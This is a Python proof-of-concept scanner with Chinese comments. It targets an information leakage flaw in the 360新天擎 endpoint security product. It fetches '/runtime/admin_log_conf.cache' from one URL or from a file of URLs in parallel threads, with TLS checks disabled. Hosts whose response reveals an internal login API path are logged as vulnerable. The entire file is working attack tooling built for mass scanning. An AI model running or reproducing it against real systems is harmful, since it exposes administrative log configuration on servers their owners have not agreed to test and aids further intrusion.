import requests
import argparse
import sys
from multiprocessing.dummy import Pool  # 导入多线程池，用于并发处理

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
               .
             .'|      .-.          .-       
           .'  |       \\ \\        / /       
          <    |        \\ \\      / /        
       _   |   | ____    \\ \\    / /_    _   
     .' |  |   | \\ .'     \\ \\  / /| '  / |  
    .   | /|   |/  .       \\ `  /.' | .' |  
  .'.'| |//|    /\\  \\       \\  / /  | /  |  
.'.'.-'  / |   |  \\  \\      / / |   `'.  |  
.'   \\_.'  '    \\  \\  \\ |`-' /  '   .'|  '/ 
          '------'  '---''..'    `-'  `--'      
                                                                                version: 1.0
    """
    print(banner)

def main():
    banner()  # 打印程序欢迎界面
    parser = argparse.ArgumentParser(description='360新天擎 information leakage! ')  # 创建命令行参数解析器
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')  # 添加url参数
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')  # 添加文件参数
    args = parser.parse_args()  # 解析命令行参数

    # 根据参数情况执行不同的操作
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(10)  # 创建包含10个线程的线程池
        mp.map(poc, url_list)  # 使用多线程并发执行 poc 函数
        mp.close()  # 关闭线程池，不再接受新的任务
        mp.join()  # 等待所有线程执行完毕
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 打印使用方法

def poc(target):
    url = target + '/runtime/admin_log_conf.cache'  # 构造目标URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"  # 设置请求头部
    }
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5).text  # 发送HTTP请求并获取响应
        if '/api/node/login' in res:  # 检查响应中是否包含特定字符串
            print(f"[+] 此url存在漏洞: {target}")  # 如果存在漏洞，打印漏洞信息
            with open("result.txt", "a+", encoding="utf-8") as f:  # 将漏洞信息写入文件
                f.write(target + "\n")
        else:
            print(f"[-] 此url不存在漏洞: {target}")  # 如果不存在漏洞，打印提示信息
    except Exception as e:  # 捕获可能发生的异常
        print(f"[*] 存在错误: {target}, {e}")  # 打印异常信息

if __name__ == '__main__':
    main()  # 调用主函数